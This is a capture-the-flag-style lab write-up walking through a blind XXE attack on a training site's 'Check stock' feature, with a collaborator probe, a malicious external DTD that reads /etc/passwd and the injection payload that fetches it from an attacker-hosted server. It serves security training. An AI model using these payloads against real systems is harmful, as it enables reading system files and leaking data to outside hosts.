# Lab: Exploiting blind XXE to retrieve data via error messages

 This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD. 

# Step 1 Find XXE

I want to see if XXE using entity definition is possible on the product page, noting my collaborator's URL`the6wc6kafwtuy237hucjrdg67cy0ood.oastify.com` I will use the following XXE payload to test:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://the6wc6kafwtuy237hucjrdg67cy0ood.oastify.com"> %xxe;]>
```

I then locate a page passing XML:

![image](https://user-images.githubusercontent.com/83407557/210408647-55682818-6ef3-4fd1-89af-eb55ba435a9f.png)

And inject my payload:

![image](https://user-images.githubusercontent.com/83407557/210408857-33efe1ba-a8f1-48ba-a120-58e1c7e3b17d.png)

Polling my collaborator, I know that I've found XXE:

![image](https://user-images.githubusercontent.com/83407557/210409036-c53e0546-aaa0-4ef6-a19c-67d1ffa9f27d.png)

# Step 2 craft error based malicious DTD file

I am given an attack-server to use for this lab:

![image](https://user-images.githubusercontent.com/83407557/210409207-215e925e-3b79-41d0-bb24-dc6209247f6b.png)

I note the attack server URL for the page I will host DTD:
`https://exploit-0abe000b04492d3dc50763c101cc00c3.exploit-server.net/exploit`

I craft the following DTD file as the body parameter that will error with the /etc/passwd file contained within:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
I store this as the body on my attack-server page:

![image](https://user-images.githubusercontent.com/83407557/210409784-1c756552-882f-4103-aad7-fdf93e404c3d.png)


# Step 3 use XXE to execute DTD file on attack server

Payload with attack server DTD file URL:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0abe000b04492d3dc50763c101cc00c3.exploit-server.net/exploit"> %xxe;]>
```
I then inject the payload into the /product/stock page:

![image](https://user-images.githubusercontent.com/83407557/210410123-2a4456cf-ec43-47eb-b3c7-81442a0f2203.png)

# Step 4 Checking logs/history

Checking the server's access logs, I see that the /exploit was requested:

![image](https://user-images.githubusercontent.com/83407557/210410479-ca2c5346-0946-479d-96b6-7e8b11c0655d.png)

Checking the http history in burp, I see that the repsonse errored, and contains the /etc/passwd file:

![image](https://user-images.githubusercontent.com/83407557/210410751-a37ee004-3566-4092-a9d4-ad4a72b2840d.png)

Which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210410893-9c469d9e-39b8-4981-8982-225ee3a5d8da.png)


